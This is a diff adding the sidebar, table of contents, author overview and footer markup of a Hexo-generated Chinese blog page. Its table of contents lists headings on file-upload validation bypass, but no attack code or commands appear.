+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-number">1.</span> <span class="nav-text">文件上传</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A0%E9%AA%8C%E8%AF%81"><span class="nav-number">1.1.</span> <span class="nav-text">无验证</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E7%AB%AF%E9%AA%8C%E8%AF%81"><span class="nav-number">1.2.</span> <span class="nav-text">前端验证</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#JS%E9%AA%8C%E8%AF%81"><span class="nav-number">1.2.1.</span> <span class="nav-text">JS验证</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#htaccess"><span class="nav-number">1.2.2.</span> <span class="nav-text">.htaccess</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MIME%E7%BB%95%E8%BF%87"><span class="nav-number">1.2.3.</span> <span class="nav-text">MIME绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%A4%B4%E6%A3%80%E6%9F%A5"><span class="nav-number">1.2.4.</span> <span class="nav-text">文件头检查</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
